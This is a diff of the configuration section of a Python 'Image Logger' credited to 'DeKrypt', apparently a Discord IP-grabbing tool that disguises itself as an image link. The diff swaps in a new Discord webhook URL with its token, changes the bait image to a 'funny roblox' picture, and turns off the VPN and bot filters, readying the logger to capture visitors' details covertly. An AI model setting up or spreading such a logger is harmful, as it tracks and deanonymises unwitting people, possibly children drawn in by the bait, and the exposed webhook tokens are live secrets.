@@ -12,13 +12,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1334919153298964490/ai6LuVcfZ8k8iI8WRGiHXC_wAFhSB5OKBp0QkecuqV0EMWcmtGteCl4Pv9EBq5z_-JO1",
-    "image": "https://catinaflat.blog/wp-content/uploads/2025/01/eco-friendly-cat-care-options.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1364243440119971922/6ovmNdIG--uZH7ipoUL67poNLBDXzZdt677iaZco-pNAJbUR4pke5ivLhyQLmanytSag",
+    "image": "https://wallpapers.com/images/hd/funny-roblox-pictures-9z5l0q78k7wwyval.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Pro", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -30,7 +30,7 @@ config = {
         "message": "Error.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+    "vpnCheck": 0, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
@@ -38,7 +38,7 @@ config = {
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
-    "antiBot": 1, # Prevents bots from triggering the alert
+    "antiBot": 0, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
                 # 1 = Don't ping when it's possibly a bot
                 # 2 = Don't ping when it's 100% a bot
